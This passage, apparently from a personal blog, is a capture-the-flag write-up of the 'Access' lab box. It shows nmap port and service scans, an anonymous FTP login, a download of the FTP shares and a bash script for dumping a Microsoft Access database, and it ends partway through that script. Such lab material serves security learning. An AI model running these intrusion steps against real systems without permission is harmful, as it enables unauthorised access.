@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Windows box.">
+    
+    <title>
+        
+            Access | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Access<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-25</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/access/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#ftp-port-21-tcp">FTP (port 21&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#anonymous-login">Anonymous login</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#exploring-the-shares">Exploring the shares</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#enumerating-backup-mdb">Enumerating backup.mdb</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#exploring-the-shares-1">Exploring the shares</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#enumerating-access-control-pst">Enumerating Access Control.pst</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#known-cves">Known CVEs</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#foothold-telnet">Foothold (Telnet)</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#version">Version</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#windows-defender">Windows Defender</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#amsi">AMSI</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#firewall">Firewall</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#yawcam">Yawcam</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#searching-for-files">Searching for files</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#known-cves-1">Known CVEs</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#inspecting-c-users-public-desktop-zkaccess3-5-security-system-lnk">Inspecting C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#credential-manager">Credential manager</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#privilege-escalation-stored-credentials">Privilege escalation (stored credentials)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/access/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2018-09-29</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/1190">egre55</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>, while the target machine's IP address will be <code>10.10.10.98</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Access using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.98<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">23/tcp open  telnet
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.98<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 21,23,80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">21/tcp open  ftp     Microsoft ftpd
+</span><span class="z-text z-plain">23/tcp open  telnet?
+</span><span class="z-text z-plain">80/tcp open  http    Microsoft IIS httpd 7.5
+</span><span class="z-text z-plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Access is running Windows. That's good to know!</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.98<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 21,23,80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">21/tcp open  ftp
+</span><span class="z-text z-plain">| ftp-syst: 
+</span><span class="z-text z-plain">|_  SYST: Windows_NT
+</span><span class="z-text z-plain">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span><span class="z-text z-plain">|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.
+</span><span class="z-text z-plain">23/tcp open  telnet
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: MegaCorp
+</span><span class="z-text z-plain">| http-methods: 
+</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> reports that FTP allows anonymous login. It failed to get a directory listing though, apparently because the data connection couldn't be opened in passive mode.</p>
+<p>It also suggests that the HTTP title of the IIS web server is 'MegaCorp'. Hmmm... that's intriguing!</p>
+<p>Anyways, let's start with FTP.</p>
+<h2 id="ftp-port-21-tcp">FTP (port <code>21/tcp</code>)</h2>
+<h3 id="anonymous-login">Anonymous login</h3>
+<p>According to <code>nmap</code>'s scans, we should be able to connect anonymously. Let's try it:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ftp 10.10.10.98</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Connected to 10.10.10.98.
+</span><span class="z-text z-plain">220 Microsoft FTP Service
+</span><span class="z-text z-plain">Name (10.10.10.98:root): anonymous
+</span><span class="z-text z-plain">331 Anonymous access allowed, send identity (e-mail name) as password.
+</span><span class="z-text z-plain">Password: 
+</span><span class="z-text z-plain">230 User logged in.
+</span><span class="z-text z-plain">Remote system type is Windows_NT.
+</span><span class="z-text z-plain">ftp&gt;
+</span></code></pre>
+<p>As expected, we successfully connected.</p>
+<h3 id="exploring-the-shares">Exploring the shares</h3>
+<p>Now let's list the shares we have access to.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ftp</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> ls</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">425 Cannot open data connection.
+</span><span class="z-text z-plain">200 PORT command successful.
+</span><span class="z-text z-plain">125 Data connection already open; Transfer starting.
+</span><span class="z-text z-plain">08-23-18  08:16PM       &lt;DIR&gt;          Backups
+</span><span class="z-text z-plain">08-24-18  09:00PM       &lt;DIR&gt;          Engineer
+</span><span class="z-text z-plain">226 Transfer complete.
+</span></code></pre>
+<p>We get the same '425 Cannot open data connection' message, but then our FTP client automatically sent a <code>PORT</code> command to switch to active mode. And it worked, so we got a directory listing!</p>
+<p>Let's download the content of these directories on our machine to explore them more efficiently.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> wget<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>ftp-user</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>anonymous<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span> ftp://10.10.10.98<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>P</span> /workspace/ftp/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>nH</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>no-passive-ftp</span></span>
+</span></code></pre>
+<p>Now let's see what these shares contain.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /workspace/ftp</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace/ftp
+</span><span class="z-text z-plain">├── .listing
+</span><span class="z-text z-plain">├── Backups
+</span><span class="z-text z-plain">│   ├── .listing
+</span><span class="z-text z-plain">│   └── backup.mdb
+</span><span class="z-text z-plain">└── Engineer
+</span><span class="z-text z-plain">    ├── .listing
+</span><span class="z-text z-plain">    └── Access Control.zip
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Both of the FTP shares seem to contain interesting files, so let's focus on <code>Backups</code> first. It contains a <code>backup.mdb</code> file... What's that?</p>
+<blockquote>
+<p>A file with the MDB file extension is a Microsoft Access database file that literally stands for Microsoft Database. This is the default database file format used in Access 2003 and earlier, while newer versions use the ACCDB format.</p>
+<p>— <a href="https://www.lifewire.com/mdb-file-2621974">Lifewire</a></p>
+</blockquote>
+<p>No wonder this box is named Access! This file must be the key to get a foothold.</p>
+<h3 id="enumerating-backup-mdb">Enumerating <code>backup.mdb</code></h3>
+<p>We can use <code>mdbtools</code> on Kali Linux to interact with this file. It's kinda hard to do by hand though, so I wrote a bash script to save some time:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Check if the correct number of arguments is provided</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-language z-shell">#</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>ne</span> 1 <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Usage: <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">0</span></span> &lt;mdb_file&gt;<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-exit z-shell">exit</span></span><span class="z-meta z-function-call z-arguments z-shell"> 1</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-variable z-other z-readwrite z-assignment z-shell">mdb_file</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">1</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Check if the MDB file exists</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-keyword z-operator z-logical z-shell">!</span> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">mdb_file</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Error: MDB file not found: <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">mdb_file</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-exit z-shell">exit</span></span><span class="z-meta z-function-call z-arguments z-shell"> 1</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Get the list of tables</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-variable z-other z-readwrite z-assignment z-shell">tables</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mdb-tables</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">mdb_file</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Check if tables are found</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-support z-function z-test z-begin z-shell">[</span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell">-</span>z</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">tables</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-support z-function z-test z-end z-shell">]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>No tables found in <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">mdb_file</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-exit z-shell">exit</span></span><span class="z-meta z-function-call z-arguments z-shell"> 0</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Loop through each table, use mdb-count to check if it&#39;s not empty,</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> and use mdb-export to display its content if not empty</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-for z-shell">for</span><span class="z-meta z-group z-for z-shell"> table <span class="z-keyword z-control z-in z-shell">in</span> <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">tables</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-variable z-other z-readwrite z-assignment z-shell">count</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">mdb-count</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">mdb_file</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">table</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span>
